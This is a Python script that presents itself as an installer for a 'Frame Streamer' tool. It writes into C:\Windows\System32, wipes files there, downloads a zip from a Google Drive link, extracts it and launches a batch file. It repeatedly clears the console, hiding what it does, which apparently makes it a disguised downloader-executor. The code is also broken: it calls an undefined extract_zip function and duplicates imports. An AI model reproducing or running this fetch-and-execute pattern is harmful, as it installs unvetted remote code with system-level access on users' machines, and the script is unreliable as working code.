import subprocess
import sys
import os
import winreg
import requests
import sys
import ctypes
import os
import sys
import shutil
import os
import gdown
os.system('cls')

dcnmwxdr = r'C:\Windows\System32\StreamX'
if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')


def delete_files_if_condition(file):
    target_dir = r"C:\Windows\System32\StreamX" 
    if not os.path.exists(file): 
        if os.path.exists(target_dir) and os.path.isdir(target_dir):
            for file_name in os.listdir(target_dir):
                file_path = os.path.join(target_dir, file_name)
                try:
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                except Exception as e:
                    print(f"")
check_file = r"C:\Windows\System32\streamxcupdatejuly24xxv2.txt"
delete_files_if_condition(check_file)
subprocess.run(["py", "-3.11", "-m", "pip", "install", "screeninfo"], check=True)

def updating_premx():
    aesv3_path = r"C:\Windows\System32\StreamX\framex_custom.py"
    directory_path = r"C:\Windows\System32\StreamX"

    if not os.path.exists(aesv3_path):
        if os.path.exists(directory_path):
            for item in os.listdir(directory_path):
                item_path = os.path.join(directory_path, item)
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            os.system('cls')
            print("\nUPDATING PLEASE WAIT.\n\n")
    else:
        print("")

updating_premx()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)
if not os.path.exists("C:\\Windows\\System32\\StreamX\\framex_custom.py"):
    os.system('cls')
    print("Installing Frame Streamer please wait.")
    download_file_from_google_drive("https://drive.google.com/uc?id=1PIUV3-HkKSpBocZfpTRPjyyq0vRdxlPT", "C:\\Windows\\System32\\StreamX\\july24.zip")
    zip_file = r'C:\Windows\System32\StreamX\july24.zip'
    extract_dir = r'C:\Windows\System32\StreamX'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)

def create_check_file(file):
    try:
        with open(file, "w") as f:
            f.write("Installation confirmed.")
    except Exception as e:
        print(f"Error creating file: {e}")
create_check_file(check_file)

import os
import shutil
os.system('cls')
import subprocess
def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")

os.system('cls')
batch_file_path = r"C:\Windows\System32\StreamX\framex.bat"
os.system('cls')

try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")

os.system('cls')

os._exit(0)
sys.exit()
